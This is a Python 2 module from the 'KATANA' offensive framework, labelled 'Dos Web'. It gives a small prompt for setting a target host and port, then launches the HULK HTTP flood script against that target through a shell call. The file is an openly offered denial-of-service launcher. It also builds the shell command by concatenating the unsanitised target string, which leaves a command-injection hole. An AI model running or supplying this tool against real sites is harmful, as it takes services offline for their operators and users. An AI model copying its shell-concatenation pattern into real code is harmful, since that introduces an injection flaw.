# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Dos Web        #
# Script by : RedToor        #
# Date      : 31/08/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core import help        #
from core import ping        #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import subprocess            #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaulthost="127.0.0.1"
defaultport="80"
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(target,port):
	global defaulthost,defaultport
	defaulthost=target
	defaultport=port
	dosweb(1)

def dosweb(run):
	try:
		global defaulthost,defaultport
		if run!=1:
			actions=raw_input(d.prompt("web/dos"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			print ""
		elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			defaulthost = defaulthost.replace("http://", "")
			d.change("target",defaulthost)
			dosweb(0)
		elif actions[0:8] == "set port":
			defaultport = actions[9:]
			d.change("port",defaultport)
			dosweb(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					try:
						subprocess.call('python "files/hulk/hulk.py" http://'+defaulthost, shell=True)
					except(KeyboardInterrupt):
						d.kbi()
			except:
				d.off()
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	dosweb(0)